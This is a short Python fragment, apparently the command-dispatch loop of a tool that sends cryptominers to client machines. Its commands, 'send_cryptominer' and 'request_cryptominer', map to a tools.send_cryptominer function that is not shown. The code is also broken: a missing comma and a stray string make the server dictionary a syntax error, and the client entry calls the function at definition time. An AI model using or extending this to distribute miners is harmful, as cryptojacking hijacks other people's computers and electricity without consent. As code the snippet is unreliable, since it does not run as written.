

def command_line(): 
    #DECLARE FUNCTIONAL COMMANDS
    SERVER_COMMANDS = { 
        "send_cryptominer" : tools.send_cryptominer
        ""
    }
    CLIENT_COMMANDS = { 
        "request_cryptominer" : tools.send_cryptominer()
    }
    
    #COMMAND LINE
    while True: 
        command = input()
        if command in SERVER_COMMANDS.keys():
            #EXECUTE COMMAND FUNCTION
            SERVER_COMMANDS[command]()
        elif command in CLIENT_COMMANDS.keys():
            #EXECUTE COMMAND FUNCTION
            CLIENT_COMMANDS[command]()

